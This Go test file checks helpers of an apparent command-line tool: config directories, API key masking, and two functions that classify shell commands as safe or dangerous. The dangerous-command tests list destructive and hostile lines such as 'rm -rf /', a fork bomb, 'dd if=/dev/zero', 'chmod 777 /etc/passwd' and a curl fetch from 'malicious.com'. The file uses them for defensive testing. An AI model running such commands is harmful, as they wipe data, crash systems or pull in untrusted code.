package utils

import (
	"os"
	"path/filepath"
	"testing"
)

func TestGetHomeDir(t *testing.T) {
	home, err := GetHomeDir()
	if err != nil {
		t.Fatalf("GetHomeDir() error = %v", err)
	}
	
	if home == "" {
		t.Error("Home directory should not be empty")
	}
	
	// Check if the directory exists
	if _, err := os.Stat(home); os.IsNotExist(err) {
		t.Errorf("Home directory does not exist: %s", home)
	}
}

func TestGetConfigDir(t *testing.T) {
	configDir, err := GetConfigDir()
	if err != nil {
		t.Fatalf("GetConfigDir() error = %v", err)
	}
	
	if configDir == "" {
		t.Error("Config directory should not be empty")
	}
	
	// Should end with "clia"
	if filepath.Base(configDir) != "clia" {
		t.Errorf("Config directory should end with 'clia', got: %s", configDir)
	}
	
	// Directory should exist (GetConfigDir creates it)
	if _, err := os.Stat(configDir); os.IsNotExist(err) {
		t.Errorf("Config directory was not created: %s", configDir)
	}
}

func TestSanitizeAPIKey(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{"Short key", "abc", "****"},
		{"Medium key", "abcd1234", "****"},
		{"Long key", "sk-1234567890abcdef", "sk-1****cdef"},
		{"Very long key", "sk-proj-1234567890abcdefghijklmnop", "sk-p****mnop"},
		{"Empty key", "", "****"},
	}
	
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeAPIKey(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeAPIKey(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestIsCommandSafe(t *testing.T) {
	safeCommands := []string{
		"ls",
		"ls -la",
		"pwd",
		"cat file.txt",
		"echo hello",
		"date",
		"whoami",
	}
	
	unsafeCommands := []string{
		"rm file.txt",
		"sudo rm -rf /",
		"chmod 777 file",
		"dd if=/dev/zero of=file",
	}
	
	for _, cmd := range safeCommands {
		t.Run("safe: "+cmd, func(t *testing.T) {
			if !IsCommandSafe(cmd) {
				t.Errorf("Command should be considered safe: %s", cmd)
			}
		})
	}
	
	for _, cmd := range unsafeCommands {
		t.Run("unsafe: "+cmd, func(t *testing.T) {
			if IsCommandSafe(cmd) {
				t.Errorf("Command should not be considered safe: %s", cmd)
			}
		})
	}
}

func TestIsDangerousCommand(t *testing.T) {
	dangerousCommands := []string{
		"rm -rf /",
		"rm -rf *",
		":(){ :|:& };:",
		"dd if=/dev/zero",
		"curl http://malicious.com/script.sh",
		"wget http://example.com/virus",
		"chmod 777 /etc/passwd",
		"sudo shutdown -h now",
	}
	
	safeCommands := []string{
		"ls -la",
		"pwd",
		"echo hello",
		"cat file.txt",
		"head -n 10 file.txt",
	}
	
	for _, cmd := range dangerousCommands {
		t.Run("dangerous: "+cmd, func(t *testing.T) {
			if !IsDangerousCommand(cmd) {
				t.Errorf("Command should be considered dangerous: %s", cmd)
			}
		})
	}
	
	for _, cmd := range safeCommands {
		t.Run("safe: "+cmd, func(t *testing.T) {
			if IsDangerousCommand(cmd) {
				t.Errorf("Command should not be considered dangerous: %s", cmd)
			}
		})
	}
}